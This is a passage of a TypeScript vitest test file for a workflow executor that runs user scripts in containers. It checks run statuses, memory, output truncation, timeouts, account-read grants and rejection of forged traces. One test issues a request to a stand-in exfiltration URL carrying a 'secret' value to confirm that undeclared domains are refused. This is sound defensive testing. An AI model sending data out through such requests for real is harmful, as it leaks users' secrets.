import { describe, it, expect, afterEach, vi } from "vitest";
import { spawn } from "node:child_process";
import dns from "node:dns";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { PassThrough } from "node:stream";
import { readFileSync } from "node:fs";
import { pathToFileURL } from "node:url";
import { writeFile } from "node:fs/promises";
import { join } from "node:path";
import { PontFactice } from "../../src/mcp/pont-factice.js";
import {
  RUN_DELAY_MS,
  MEMORY_GAP_MS,
  PUBLICATIONS_GAP_MS,
  MEMORY_NOT_KEPT,
  PROFILE_DENIED,
  executerWorkflow,
  type WorkflowContext,
  type InfraWorkflow,
  type ProcessLauncher,
} from "../../src/workflows/executer.js";
import { SORTIE_MAX_OCTETS } from "../../src/workflows/executions.js";
import { SEARCHES_CAP, SEARCHES_STOPPED, TOO_MANY_READS, fetch } from "../../src/workflows/acces.js";
import { SEARCH_DENIED, UNREADABLE_RESULTS, extractResults, urlRecherche } from "../../src/workflows/duckduckgo.js";
import { Pacing } from "../../src/workflows/menagement.js";
import { WEB_REQUIRED } from "../../src/workflows/valider.js";
import { LIGNE_MAX_OCTETS, DATA_MAX_SIZE } from "../../src/workflows/protocole.js";
import { DATA_MAX_SIZE as TAILLE_MAX_DONNEES_ACCUEIL } from "../../src/accueil/schemas.js";
import { REPLAY_TOO_BIG } from "../../src/workflows/rejeu.js";
import { paramsHash, type BlocksMemory } from "../../src/workflows/memoire.js";
import { validateWorkflow } from "../../src/workflows/valider.js";
import { tempFolder } from "../aide/temporaire.js";
import { Atelier } from "../../src/conteneur/atelier.js";
import { spacePaths } from "../../src/chemins.js";
import { streamingChain } from "../../src/workflows/chaine.js";
import { ACTION_STOPPED } from "../../src/workflows/executions.js";
import type { Owner } from "../../src/workflows/schema.js";
import type { DirectTrace } from "../../src/workflows/executer.js";

const ENGINE = join(import.meta.dirname, "..", "..", "docker", "moteur");
const SCRIPT = join(ENGINE, "recolteur.mjs");
const NOW = new Date("2026-10-29T10:00:00.000Z");

const toClose: { fermer(): Promise<void> }[] = [];
afterEach(async () => {
  await Promise.all(toClose.splice(0).map((s) => s.fermer()));
});

async function webServer(routes: Record<string, (res: import("node:http").ServerResponse) => void>) {
  const requests: string[] = [];
  const s: Server = createServer((req, res) => {
    requests.push(req.url ?? "");
    const r = routes[req.url ?? ""];
    if (r) r(res);
    else {
      res.writeHead(404);
      res.end();
    }
  });
  await new Promise<void>((ok) => s.listen(0, "127.0.0.1", ok));
  const port = (s.address() as AddressInfo).port;
  const server = {
    port,
    url: `http://127.0.0.1:${port}`,
    requetes: requests,
    fermer: () => new Promise<void>((ok) => { s.closeAllConnections(); s.close(() => ok()); }),
  };
  toClose.push(server);
  return server;
}

const valid = (brut: unknown) => {
  const r = validateWorkflow(brut);
  if (!r.ok) throw new Error(r.erreur);
  return r.valide;
};

/** code (file `<id>.mjs`) → … → sortie, in a chain. */
const chain = (...ids: string[]) => ({
  version: 1,
  blocs: [...ids.map((id) => ({ id, type: "code", parametres: { source: `${id}.mjs` } })), { id: "sortie", type: "sortie", parametres: { vers: "widget" } }],
  liens: [...ids, "sortie"].slice(1).map((to, i) => ({ de: [...ids, "sortie"][i]!, vers: to })),
});

/** The owner as the bench records it: a widget's id (as before), `action:<id>` for an action. */
const nameOf = (p: string | Owner) => (typeof p === "string" ? p : p.type === "widget" ? p.id : `action:${p.id}`);

interface Banc {
  ctx: WorkflowContext;
  infra: InfraWorkflow;
  commandes: string[][];
  supprimes: string[];
  tues: number;
  refusEnCours: number;
}

/** A widget (files in a temporary folder) and a launcher that runs the harvester locally, without docker. */
async function banc(
  workflow: unknown,
  files: Record<string, string> = {},
  o: { compte?: string[]; publiques?: string[]; accord?: { profil: string } | null; pont?: PontFactice; memoire?: BlocksMemory; delaiMs?: number; lancer?: ProcessLauncher } = {},
): Promise<Banc> {
  const dossier = await tempFolder();
  for (const [name, content] of Object.entries(files)) await writeFile(join(dossier, name), content);
  const b: Banc = {
    commandes: [],
    supprimes: [],
    tues: 0,
    refusEnCours: 0,
    ctx: {
      proprietaire: { type: "widget", id: "essai" },
      valide: valid(workflow),
      dossierFichiers: dossier,
      config: { interets: "rust" },
      precedent: null,
      memoire: o.memoire ?? {},
      sources: { compte: o.compte ?? [], publiques: o.publiques ?? [] },
      accord: async () => (o.accord === undefined ? null : o.accord),
      surProfilRefuse: async () => {
        b.refusEnCours++;
      },
      messageAccordRequis: "Accord requis pour lire avec ton compte : app.daily.dev",
      declencheur: "manuelle",
    },
    infra: {
      moteur: ENGINE,
      atelier: {
        commandeRecolte: (p, d, m) => ["docker", "run", nameOf(p), d, m],
        supprimerRecolte: async (p) => {
          b.supprimes.push(nameOf(p));
        },
      },
      lancer:
        o.lancer ??
        ((cmd, args) => {
          b.commandes.push([cmd, ...args]);
          const e = spawn(process.execPath, [SCRIPT, dossier], { stdio: ["pipe", "pipe", "pipe"] });
          return {
            stdin: e.stdin,
            stdout: e.stdout,
            stderr: e.stderr,
            tuer: () => {
              b.tues++;
              e.kill("SIGKILL");
            },
            fin: new Promise((ok) => e.on("close", (c) => ok(c))),
          };
        }),
      ia: null,
      pont: o.pont ?? new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } }),
      horloge: () => NOW,
      delaiMs: o.delaiMs,
      adressesLocales: true,
    },
  };
  return b;
}

/** A fake process that writes these lines on stdout then exits with `code`. */
const scriptedLauncher = (lignes: unknown[], code = 0): ProcessLauncher => () => {
  const stdout = new PassThrough();
  const stderr = new PassThrough();
  const stdin = new PassThrough();
  stdin.resume();
  const fin = new Promise<number | null>((ok) => {
    setImmediate(() => {
      for (const l of lignes) stdout.write((typeof l === "string" ? l : JSON.stringify(l)) + "\n");
      stdout.end();
      stderr.end();
      setImmediate(() => ok(code));
    });
  });
  return { stdin, stdout, stderr, tuer: () => {}, fin };
};

describe("executerWorkflow", () => {
  it("a code → sortie workflow returns fin with the value and a successful run block by block", async () => {
    const b = await banc(chain("a"), {
      "a.mjs": `export default async (entree, w) => { w.journal("bonjour", 2); return [{ x: 1 }, { x: 2 }, w.config]; };`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "fin", sortie: { vers: "widget", valeur: [{ x: 1 }, { x: 2 }, { interets: "rust" }] }, memoire: {} });
    expect(r.execution).toMatchObject({
      version: 1,
      id: "2026-10-29T10-00-00-000Z",
      proprietaire: { type: "widget", id: "essai" },
      declencheur: "manuelle",
      debut: NOW.toISOString(),
      fin: NOW.toISOString(),
      statut: "reussie",
    });
    expect(r.execution.erreur).toBeUndefined();
    expect(r.execution.blocs).toEqual([
      { id: "a", type: "code", statut: "reussi", debut: NOW.toISOString(), fin: NOW.toISOString(), elements: 3, sortie: [{ x: 1 }, { x: 2 }, { interets: "rust" }], journal: ["bonjour 2"] },
      { id: "sortie", type: "sortie", statut: "reussi", debut: NOW.toISOString(), fin: NOW.toISOString(), elements: 3, sortie: [{ x: 1 }, { x: 2 }, { interets: "rust" }], journal: [] },
    ]);
    // The global log keeps what the code writes (stderr), as before workflows.
    expect(r.journal).toContain("bonjour 2");
    expect(b.commandes[0]).toEqual(["docker", "run", "essai", b.ctx.dossierFichiers, ENGINE]);
    expect(b.supprimes).toEqual(["essai"]);
  });

  it("a container of the same name left by an abrupt stop is removed before launch", async () => {
    const b = await banc(chain("a"), { "a.mjs": `export default () => 1;` });
    const lancer = b.infra.lancer!;
    let before: string[] = [];
    b.infra.lancer = (cmd, args) => ((before = [...b.supprimes]), lancer(cmd, args));
    await executerWorkflow(b.ctx, b.infra);
    expect(before).toEqual(["essai"]);
  });

  it("a partial block gives a partial run", async () => {
    const web = await webServer({ "/a": (res) => res.end("contenu a") });
    const b = await banc(
      {
        version: 1,
        blocs: [
          { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
          { id: "lire", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
          { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
        ],
        liens: [{ de: "liste", vers: "lire" }, { de: "lire", vers: "sortie" }],
      },
      { "liste.mjs": `export default async () => [{ url: "${web.url}/a" }, { url: "${web.url}/absente" }];` },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue.t).toBe("fin");
    expect(r.execution.statut).toBe("partielle");
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "partiel", "reussi"]);
    expect(r.execution.blocs[1]!.sortie).toEqual([{ url: `${web.url}/a`, contenu: "contenu a" }, { url: `${web.url}/absente` }]);
    expect(r.execution.blocs[1]!.journal.join("\n")).toMatch(/404/);
  });

  it("a failed block: outcome echec, failed run, following blocks pas-lance", async () => {
    const b = await banc(chain("a", "b"), {
      "a.mjs": `export default async () => { throw new Error("cassé : x"); };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "echec", erreur: "cassé : x", erreurDuCode: true });
    expect(r.execution.statut).toBe("echouee");
    expect(r.execution.erreur).toBe("cassé : x");
    expect(r.execution.erreurNoyau).toBeUndefined();
    expect(r.execution.blocs).toEqual([
      { id: "a", type: "code", statut: "echoue", debut: NOW.toISOString(), fin: NOW.toISOString(), elements: null, erreur: "cassé : x", journal: [] },
      { id: "b", type: "code", statut: "pas-lance", debut: null, fin: null, elements: null, journal: [] },
      { id: "sortie", type: "sortie", statut: "pas-lance", debut: null, fin: null, elements: null, journal: [] },
    ]);
  });

  it("the memory sent by the container comes back in the fin outcome", async () => {
    const workflow = {
      version: 1,
      blocs: [
        { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
        { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "url" } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "liste", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
    };
    const files = { "liste.mjs": `export default async () => [{ url: "a" }, { url: "b" }];` };
    const premier = await banc(workflow, files);
    const r1 = await executerWorkflow(premier.ctx, premier.infra);
    expect(r1.issue.t === "fin" && r1.issue.sortie.valeur).toEqual([{ url: "a" }, { url: "b" }]);
    const memory = r1.issue.t === "fin" ? r1.issue.memoire : null;
    expect(memory?.nouveaux?.type).toBe("liste.nouveaux");

    // The memory is sent back to the container: nothing new next time. An entry of another block does not pass.
    const second = await banc(workflow, files, { memoire: { ...memory!, ailleurs: { type: "liste.nouveaux", valeur: [] } } });
    const r2 = await executerWorkflow(second.ctx, second.infra);
    expect(r2.issue.t === "fin" && r2.issue.sortie.valeur).toEqual([]);
    expect(r2.issue.t === "fin" && Object.keys(r2.issue.memoire ?? {})).toEqual(["nouveaux"]);
  });

  it("a trace for an unknown or malformed block is ignored", async () => {
    const b = await banc(chain("a"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "bloc", id: "inconnu", etape: "debut" });
        l({ t: "bloc", id: "inconnu", etape: "fin", statut: "reussi", sortie: 1 });
        l({ t: "journal", bloc: "inconnu", texte: "x" });
        l({ t: "bloc", id: "sortie", etape: "fin", statut: "bizarre" });
        l({ t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: "forgée" });
        process.stdout.write("pas du json\\n");
        return 1;
      };`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: 1 } });
    expect(r.execution.blocs.map((x) => x.id)).toEqual(["a", "sortie"]);
    expect(r.execution.blocs[1]).toMatchObject({ statut: "reussi", sortie: 1 });
  });

  it("a forged trace for a block that is not the next one does not count", async () => {
    const b = await banc(chain("a", "b"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "bloc", id: "b", etape: "debut" });
        l({ t: "bloc", id: "b", etape: "fin", statut: "reussi", sortie: "forgée" });
        throw new Error("cassé");
      };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "echec", erreur: "cassé" });
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["echoue", "pas-lance", "pas-lance"]);
    expect(r.execution.blocs[1]!.sortie).toBeUndefined();
  });

  it("forged memory: only the workflow's blocks with their type, the last line before fin counts", async () => {
    const workflow = {
      version: 1,
      blocs: [
        { id: "amont", type: "code", parametres: { source: "amont.mjs" } },
        { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "url" } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "amont", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
    };
    const b = await banc(workflow, {}, {
      lancer: scriptedLauncher([
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["premiere"] } } },
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["x"] }, autre: { type: "liste.nouveaux", valeur: 1 }, sortie: { type: "code", valeur: 2 } } },
        { t: "memoire", memoire: "pas un objet" },
        { t: "fin", donnees: [] },
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["après fin"] } } },
      ]),
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "fin", sortie: { vers: "widget", valeur: [] }, memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["x"], empreinte: paramsHash({ cle: "url" }) } } });
    // No block trace received: a block never started stays pas-lance.
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["pas-lance", "pas-lance", "pas-lance"]);
  });

  it("a memory over 3 MB is dropped with a note in the log", async () => {
    const b = await banc({ version: 1, blocs: [{ id: "amont", type: "code", parametres: { source: "amont.mjs" } }, { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "url" } }, { id: "sortie", type: "sortie" , parametres: { vers: "widget" } }], liens: [{ de: "amont", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }] }, {}, {
      lancer: scriptedLauncher([
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: "x".repeat(3.5 * 1024 * 1024) } } },
        { t: "fin", donnees: 1 },
      ]),
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", memoire: null });
    expect(r.journal).toContain(MEMORY_NOT_KEPT);
    // Also in the run, in the output block's log.
    expect(r.execution.blocs.find((x) => x.id === "sortie")!.journal).toEqual([MEMORY_NOT_KEPT]);
  });

  it("a trace of a started block without an end gives it failed; block log bounded to 200 lines of 500 characters", async () => {
    const b = await banc(chain("a"), {}, {
      lancer: scriptedLauncher([
        { t: "bloc", id: "a", etape: "debut" },
        ...Array.from({ length: 250 }, (_, i) => ({ t: "journal", bloc: "a", texte: `${i} ${"y".repeat(800)}` })),
        { t: "echec", erreur: "arrêt" },
      ], 1),
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "echec", erreur: "arrêt", erreurDuCode: true });
    const a = r.execution.blocs[0]!;
    expect(a.statut).toBe("echoue");
    expect(a.journal).toHaveLength(200);
    expect(a.journal[0]).toMatch(/51 lignes coupées/);
    expect(a.journal[199]!.startsWith("249 ")).toBe(true);
    expect(a.journal.every((l) => l.length <= 500)).toBe(true);
    expect(r.execution.blocs[1]!.statut).toBe("pas-lance");
  });

  it("a 5 MB output (huge page) arrives truncated and marked, without stopping the run", async () => {
    const b = await banc(chain("enorme", "moyenne", "court"), {
      "enorme.mjs": `export default async () => "x".repeat(5 * 1024 * 1024);`,
      "moyenne.mjs": `export default async (e) => e.slice(0, 1024 * 1024);`,
      "court.mjs": `export default async (e) => ({ longueur: e.length });`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: { longueur: 1024 * 1024 } } });
    expect(r.execution.statut).toBe("reussie");
    const [huge, moyenne, court] = r.execution.blocs;
    expect(huge).toMatchObject({ statut: "reussi", sortieTronquee: true });
    expect(huge!.sortie).toBeUndefined();
    expect(moyenne).toMatchObject({ statut: "reussi", sortieTronquee: true });
    expect(typeof moyenne!.sortie).toBe("string");
    expect(Buffer.byteLength(moyenne!.sortie as string)).toBeLessThanOrEqual(SORTIE_MAX_OCTETS);
    expect((moyenne!.sortie as string).startsWith('"xxx')).toBe(true);
    expect(court).toMatchObject({ statut: "reussi", sortie: { longueur: 1024 * 1024 } });
    expect(court!.sortieTronquee).toBeUndefined();
  });

  it("lirePage with an account without a grant: accord-requis stop", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } });
    const b = await banc(chain("a"), { "a.mjs": `export default async (e, w) => w.lirePage("https://app.daily.dev/", { compte: true });` }, { compte: ["app.daily.dev"], accord: null, pont });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(r.execution).toMatchObject({ statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev", erreurNoyau: true });
    expect(r.execution.blocs[0]!.statut).toBe("echoue");
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(0);
    expect(b.supprimes).toEqual(["essai", "essai"]);
  });

  it("ProfilRefuse: surProfilRefuse called, PROFIL_REFUSE stop", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [], refuser: ["perso"] } });
    const b = await banc(chain("a"), { "a.mjs": `export default async (e, w) => w.lirePage("https://app.daily.dev/", { compte: true });` }, { compte: ["app.daily.dev"], accord: { profil: "perso" }, pont });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(b.refusEnCours).toBe(1);
    expect(r.issue).toEqual({ t: "arret", statut: "accord-requis", erreur: PROFILE_DENIED });
    expect(r.execution.statut).toBe("accord-requis");
  });

  it("an early fin written by the code: partial run, following blocks pas-lance", async () => {
    const b = await banc(chain("a", "b"), {
      "a.mjs": `export default async () => {
        process.stdout.write(JSON.stringify({ t: "fin", donnees: "tôt" }) + "\\n");
        await new Promise((ok) => setTimeout(ok, 50));
        process.exit(0);
      };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "tôt" } });
    expect(r.execution.statut).toBe("partielle");
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["echoue", "pas-lance", "pas-lance"]);
  });

  it("grant removed between two reads with an account: accord-requis stop, no second read", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [{ url: "https://app.daily.dev/", titre: "Fil", texte: "articles", liens: [] }] } });
    const b = await banc(
      chain("a"),
      { "a.mjs": `export default async (e, w) => { await w.lirePage("https://app.daily.dev/", { compte: true }); return w.lirePage("https://app.daily.dev/", { compte: true }); };` },
      { compte: ["app.daily.dev"], pont },
    );
    let lectures = 0;
    b.ctx.accord = async () => (lectures++ === 0 ? { profil: "perso" } : null);
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(r.execution.statut).toBe("accord-requis");
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(1);
    expect(b.supprimes).toEqual(["essai", "essai"]);
  });

  it("lirePage with an account and a grant: the bridge receives the profile and the declared domains", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [{ url: "https://app.daily.dev/", titre: "Fil", texte: "articles", liens: [] }] } });
    const b = await banc(chain("a"), { "a.mjs": `export default async (e, w) => (await w.lirePage("https://app.daily.dev/", { compte: true })).texte;` }, { compte: ["app.daily.dev"], accord: { profil: "perso" }, pont });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "articles" } });
    expect(pont.appels.find((a) => a.methode === "lirePageInvisible")!.args).toEqual(["https://app.daily.dev/", { profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true }]);
  });

  it("lirePage with defiler: the bridge receives it (with or without an account); 0 passes nothing; outside 0 to 20, refused", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } });
    const b = await banc(
      chain("a"),
      {
        "a.mjs": `const essai = (p) => p.then(() => "ok", (e) => "refus: " + e.message);
        export default async (e, w) => [
          await essai(w.lirePage("https://app.daily.dev/a", { defiler: 8 })),
          await essai(w.lirePage("https://app.daily.dev/b", { compte: true, defiler: 2 })),
          await essai(w.lirePage("https://app.daily.dev/c", { defiler: 0 })),
          await essai(w.lirePage("https://app.daily.dev/d", { defiler: 21 })),
        ];`,
      },
      { compte: ["app.daily.dev"], publiques: ["app.daily.dev"], accord: { profil: "perso" }, pont },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: ["ok", "ok", "ok", "refus: Arguments invalides pour lirePage"] } });
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible").map((a) => a.args)).toEqual([
      ["https://app.daily.dev/a", { profil: null, domaines: ["app.daily.dev"], adressesLocales: true, defiler: 8 }],
      ["https://app.daily.dev/b", { profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true, defiler: 2 }],
      ["https://app.daily.dev/c", { profil: null, domaines: ["app.daily.dev"], adressesLocales: true }],
    ]);
  });

  it("recuperer to an undeclared domain for an owner with an account: refused", async () => {
    const web = await webServer({ "/": (res) => res.end("ok") });
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } });
    const b = await banc(
      chain("a"),
      {
        "a.mjs": `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
        export default async (e, w) => [
          await essai(w.recuperer("https://exfiltration.fr/?d=secret")),
          await essai(w.recuperer("http://localhost:${web.port}/")),
          await essai(w.lirePage("https://exfiltration.fr/")),
          await essai(w.recuperer("${web.url}/")),
        ];`,
      },
      { compte: ["app.daily.dev"], publiques: ["127.0.0.1"], accord: { profil: "perso" }, pont },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    const [externe, otherName, page, declare] = (r.issue.t === "fin" ? r.issue.sortie.valeur : []) as string[];
    expect(externe).toMatch(/^refus: .*non déclaré/);
    expect(otherName).toMatch(/^refus: .*non déclaré/);
    expect(page).toMatch(/^refus: .*non déclaré/);
    expect(declare).toBe("ok");
    expect(web.requetes).toHaveLength(1);
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(0);
  });

  it("timeout exceeded: in-flight AI calls are abandoned", async () => {
    const b = await banc(chain("a"), { "a.mjs": `export default (e, w) => Promise.all([w.kev("s", {}), w.gemma("p")]);` }, { delaiMs: 600 });
    const signals: (AbortSignal | undefined)[] = [];
    b.infra.ia = {
      kev: (_c, o) => (signals.push(o?.signal), new Promise(() => {})),
      gemma: (g) => (signals.push(g.signal), new Promise(() => {})),
    };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "arret", erreur: "Délai dépassé" });
    expect(signals).toHaveLength(2);
    expect(signals.every((s) => s?.aborted)).toBe(true);
  });

  it("timeout exceeded: « Délai dépassé » stop and container removed", async () => {
    const b = await banc(chain("a"), { "a.mjs": `export default () => new Promise(() => {});` }, { delaiMs: 600 });
    const debut = Date.now();
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(Date.now() - debut).toBeLessThan(5000);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    expect(r.execution).toMatchObject({ statut: "echouee", erreur: "Délai dépassé", erreurNoyau: true });
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["echoue", "pas-lance"]);
    expect(b.tues).toBeGreaterThan(0);
    expect(b.supprimes).toEqual(["essai", "essai"]);
    expect(RUN_DELAY_MS).toBe(200_000);
  });

  it("the debut carries the validated workflow and the config; the memory follows", async () => {
    const received: string[] = [];
    const b = await banc(chain("a"), {}, {
      lancer: () => {
        const p = scriptedLauncher([{ t: "fin", donnees: null }])("", []);
        p.stdin.on("data", (d: Buffer) => received.push(d.toString()));
        return p;
      },
      memoire: { a: { type: "code", valeur: 1 } },
    });
    b.ctx.precedent = { ancien: true };
    await executerWorkflow(b.ctx, b.infra);
    const lignes = received.join("").trim().split("\n").map((l) => JSON.parse(l));
    expect(lignes[0]).toEqual({
      t: "debut",
      precedent: { ancien: true },
      maintenant: NOW.toISOString(),
      config: { interets: "rust" },
      workflow: { blocs: b.ctx.valide.workflow.blocs, liens: b.ctx.valide.workflow.liens, ordre: ["a", "sortie"] },
    });
    expect(lignes[1]).toEqual({ t: "memoire", memoire: { a: { type: "code", valeur: 1 } } });
  });

  /** The lines the container receives (start, memory) and the returned memory, for a workflow `a` → `sortie`. */
  async function memoryViewedByContainer(workflow: unknown, memory: BlocksMemory, rendered: BlocksMemory = {}) {
    const received: string[] = [];
    const b = await banc(workflow, {}, {
      lancer: () => {
        const p = scriptedLauncher([{ t: "memoire", memoire: rendered }, { t: "fin", donnees: null }])("", []);
        p.stdin.on("data", (d: Buffer) => received.push(d.toString()));
        return p;
      },
      memoire: memory,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    const lignes = received.join("").trim().split("\n").map((l) => JSON.parse(l));
    return { envoyee: lignes[1].memoire as BlocksMemory, rendue: r.issue.t === "fin" ? r.issue.memoire : null, ctx: b.ctx };
  }

  it("a memory whose hash no longer matches the parameters is not sent to the container", async () => {
    const wf = (key: string) => ({
      version: 1,
      blocs: [
        { id: "a", type: "code", parametres: { source: "a.mjs" } },
        { id: "n", type: "liste.nouveaux", parametres: { cle: key } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "a", vers: "n" }, { de: "n", vers: "sortie" }],
    });
    const memory: BlocksMemory = {
      n: { type: "liste.nouveaux", valeur: ["x"], empreinte: paramsHash({ cle: "url" }) },
      a: { type: "code", valeur: 1 }, // old memory without a hash: accepted once
    };
    const same = await memoryViewedByContainer(wf("url"), memory);
    expect(same.envoyee).toEqual({ n: { type: "liste.nouveaux", valeur: ["x"] }, a: { type: "code", valeur: 1 } }); // without the hash
    const others = await memoryViewedByContainer(wf("titre"), memory);
    expect(others.envoyee).toEqual({ a: { type: "code", valeur: 1 } });
  });

  it("the returned memory is marked with the hash of the run's parameters, even if workflow.json changed meanwhile", async () => {
    // The run never reads workflow.json: it receives ctx.valide, validated at the start. A file rewritten during
    // the run therefore changes nothing about what is marked; the new settings do not find this memory.
    const wf = (key: string) => ({
      version: 1,
      blocs: [
        { id: "a", type: "code", parametres: { source: "a.mjs" } },
        { id: "n", type: "liste.nouveaux", parametres: { cle: key } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "a", vers: "n" }, { de: "n", vers: "sortie" }],
    });
    const premiere = await memoryViewedByContainer(wf("url"), {}, { n: { type: "liste.nouveaux", valeur: ["vu"] } });
    expect(premiere.rendue).toEqual({ n: { type: "liste.nouveaux", valeur: ["vu"], empreinte: paramsHash({ cle: "url" }) } });
    // workflow.json changed (cle: titre): the second run receives an empty memory for this block.
    const seconde = await memoryViewedByContainer(wf("titre"), premiere.rendue!);
    expect(seconde.envoyee).toEqual({});
  });

  describe("trials (replay from a block)", () => {
    const T = NOW.toISOString();
    /** a → b → c → sortie: replay from c, b reused (2 elements), a neither relaunched nor reused. */
    const replayFromC = { relances: ["c", "sortie"], sorties: { b: [{ x: 1 }, { x: 2 }] }, repris: { b: 2 } };

    it("a trial returns a run with repris, pas-lance and the relaunched blocks", async () => {
      const b = await banc(chain("a", "b", "c"), {
        "a.mjs": `export default async () => { throw new Error("a lancé"); };`,
        "b.mjs": `export default async () => { throw new Error("b lancé"); };`,
        "c.mjs": `export default async (entree) => entree.map((e) => e.x * 10);`,
      });
      b.ctx.declencheur = "rejeu";
      b.ctx.rejeu = replayFromC;
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(r.issue).toEqual({ t: "fin", sortie: { vers: "widget", valeur: [10, 20] }, memoire: null });
      expect(r.execution.statut).toBe("reussie");
      expect(r.execution.declencheur).toBe("rejeu");
      expect(r.execution.blocs).toEqual([
        { id: "a", type: "code", statut: "pas-lance", debut: null, fin: null, elements: null, journal: [] },
        { id: "b", type: "code", statut: "repris", debut: null, fin: null, elements: 2, journal: [] },
        { id: "c", type: "code", statut: "reussi", debut: T, fin: T, elements: 2, sortie: [10, 20], journal: [] },
        { id: "sortie", type: "sortie", statut: "reussi", debut: T, fin: T, elements: 2, sortie: [10, 20], journal: [] },
      ]);
    });

    it("a trial: the status counts only the relaunched blocks, and lines forged for a reused or non-relaunched block are rejected", async () => {
      const b = await banc(chain("a", "b", "c"), {}, {
        lancer: scriptedLauncher([
          { t: "bloc", id: "b", etape: "debut" },
          { t: "journal", bloc: "b", texte: "forgé" },
          { t: "bloc", id: "b", etape: "fin", statut: "reussi", sortie: "forgée" },
          { t: "journal", bloc: "a", texte: "forgé" },
          { t: "bloc", id: "c", etape: "debut" },
          { t: "bloc", id: "c", etape: "fin", statut: "reussi", sortie: [1] },
          { t: "bloc", id: "a", etape: "debut" },
          { t: "bloc", id: "sortie", etape: "debut" },
          { t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: [1] },
          { t: "fin", donnees: [1] },
        ]),
      });
      b.ctx.rejeu = replayFromC;
      const relayed: unknown[] = [];
      b.infra.surTrace = (t) => relayed.push(t);
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(r.execution.statut).toBe("reussie");
      expect(r.execution.blocs.map((x) => [x.id, x.statut])).toEqual([["a", "pas-lance"], ["b", "repris"], ["c", "reussi"], ["sortie", "reussi"]]);
